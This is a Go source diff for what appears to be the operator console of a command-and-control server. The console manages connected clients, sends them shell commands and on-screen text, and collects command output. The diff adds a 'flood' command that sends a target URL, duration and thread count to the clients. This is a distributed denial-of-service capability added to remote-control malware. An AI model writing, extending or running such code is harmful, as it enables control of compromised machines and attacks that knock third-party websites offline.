@@ -12,7 +12,8 @@ import (
 	"strings"
 	"time"
 
-	pb "github.com/Xart3mis/AKILTC/pb"
+	"github.com/Xart3mis/AKILTC/pb"
+	"github.com/charmbracelet/bubbles/spinner"
 	tea "github.com/charmbracelet/bubbletea"
 	"github.com/charmbracelet/lipgloss"
 	"github.com/fatih/color"
@@ -26,6 +27,14 @@ type server struct {
 	pb.ConsumerServer
 }
 
+type floodParamas struct {
+	url         string
+	num_threads int
+	limit       int
+}
+
+var flood_params *floodParamas = nil
+
 var current_id string = ""
 
 var client_ids []string
@@ -34,6 +43,18 @@ var client_mapids map[int]string = make(map[int]string)
 var client_onscreentext map[string]string = make(map[string]string)
 var client_execcommand map[string]string = make(map[string]string)
 var client_execoutput map[string]string = make(map[string]string)
+
+var banner string = `
+▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
+▒████▄     ██▄█▒ ▓██▒▓██▒    ▓  ██▒ ▓▒
+▒██  ▀█▄  ▓███▄░ ▒██▒▒██░    ▒ ▓██░ ▒░
+░██▄▄▄▄██ ▓██ █▄ ░██░▒██░    ░ ▓██▓ ░ 
+ ▓█   ▓██▒▒██▒ █▄░██░░██████▒  ▒██▒ ░ 
+ ▒▒   ▓▒█░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░  ▒ ░░   
+  ▒   ▒▒ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░    ░    
+  ░   ▒   ░ ░░ ░  ▒ ░  ░ ░     ░      
+      ░  ░░  ░    ░      ░  ░         
+`
 
 func main() {
 	go func() {
@@ -130,22 +151,39 @@ func (s *server) SubscribeOnScreenText(r *pb.ClientDataRequest, in pb.Consumer_S
 				ShouldUpdate: false,
 				OnScreenText: ""}})
 		}
-		time.Sleep(250 * time.Millisecond)
+		time.Sleep(50 * time.Millisecond)
 	}
+}
+
+func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, error) {
+	if flood_params != nil {
+		x := flood_params
+		flood_params = nil
+		return &pb.FloodData{
+			ShouldFlood: true,
+			Url:         x.url,
+			Limit:       int64(x.limit),
+			NumThreads:  int64(x.num_threads)}, nil
+	}
+
+	return &pb.FloodData{ShouldFlood: false}, nil
 }
 
 type model struct {
 	textInput           textinput.Model
-	typing              bool
 	showhelplist        bool
 	showclientlist      bool
 	showok              bool
 	shownotvalidcid     bool
 	shownotvalidtext    bool
 	shownotvalidcommand bool
+	showfloodusage      bool
+	showfloodoutput     bool
 	showexecout         bool
 	err                 error
 	clients             []string
+
+	spinner spinner.Model
 }
 
 func initialModel() model {
@@ -161,14 +199,16 @@ func initialModel() model {
 	ti.CharLimit = 156
 	ti.Width = 20
 
-	ti.CandidateWords = []string{"help", "settext", "select", "exit", "exec", "list_clients", "cleartext"}
+	ti.CandidateWords = []string{"help", "settext", "select", "exit", "exec", "list_clients", "cleartext", "flood"}
 	ti.StyleCandidate.Foreground(lipgloss.Color("#BC4749"))
 	ti.CandidateViewMode = textinput.CandidateViewHorizental
+
+	s := spinner.New()
+	s.Spinner = spinner.Dot
 
 	return model{
 		textInput:           ti,
 		err:                 nil,
-		typing:              true,
 		showhelplist:        false,
 		showok:              false,
 		showclientlist:      false,
@@ -176,11 +216,16 @@ func initialModel() model {
 		shownotvalidtext:    false,
 		shownotvalidcommand: false,
 		showexecout:         false,
+		showfloodusage:      false,
+		showfloodoutput:     false,
 		clients:             client_ids,
+
+		spinner: s,
 	}
 }
 
 func (m model) Init() tea.Cmd {
+	m.spinner.Tick()
 	return textinput.Blink
 }
 
@@ -202,6 +247,7 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			m.shownotvalidcommand = false
 			m.shownotvalidtext = false
 			m.shownotvalidcid = false
+			m.showfloodusage = false
 			m.showclientlist = false
 			m.showhelplist = false
 			m.showexecout = false
@@ -225,8 +271,10 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			if len(m.textInput.Value()) > 6 && m.textInput.Value()[:6] == "select" {
 				split_str := strings.Fields(m.textInput.Value())
 				if len(split_str) > 2 {
-					panic("select only takes 1 argument")
+					m.shownotvalidcid = true
+					return m, nil
 				}
+
 				val, err := strconv.Atoi(split_str[1])
 				if err != nil {
 					m.shownotvalidcid = true
@@ -260,6 +308,27 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 				return m, nil
 			}
 
+			if len(m.textInput.Value()) >= 5 && m.textInput.Value()[:5] == "flood" {
+				split_str := strings.Fields(m.textInput.Value())
+				if len(split_str) <= 3 {
+					m.showfloodusage = true
+					return m, nil
+				}
+
+				threads, err := strconv.Atoi(split_str[3])
+				if err != nil {
+					m.showfloodusage = true
+				}
+
+				limit, err := strconv.Atoi(split_str[2])
+				if err != nil {
+					m.showfloodusage = true
+				}
+
+				flood_params = &floodParamas{url: split_str[1], limit: limit, num_threads: threads}
+				m.showfloodoutput = true
+			}
+
 			switch m.textInput.Value() {
 			case "help":
 				m.showhelplist = true
@@ -278,6 +347,7 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		return m, nil
 	}
 
+	// m.spinner, cmd = m.spinner.Update(msg)
 	m.textInput, cmd = m.textInput.Update(msg)
 	return m, cmd
 
@@ -321,5 +391,15 @@ func (m model) View() string {
 		red := color.New(color.FgRed).SprintFunc()
 		return m.textInput.View() + "\n\n" + red("Not a valid command.")
 	}
-	return m.textInput.View()
+	if m.showfloodusage {
+		red := color.New(color.FgRed).SprintFunc()
+		return m.textInput.View() + "\n\n" + red("usage: flood [url] [time limit] [threads]")
+	}
+	if m.showfloodoutput {
+
+		(&m).showfloodoutput = false
+		return m.textInput.View()
+	}
+
+	return color.RedString(banner) + "\n" + m.textInput.View()
 }
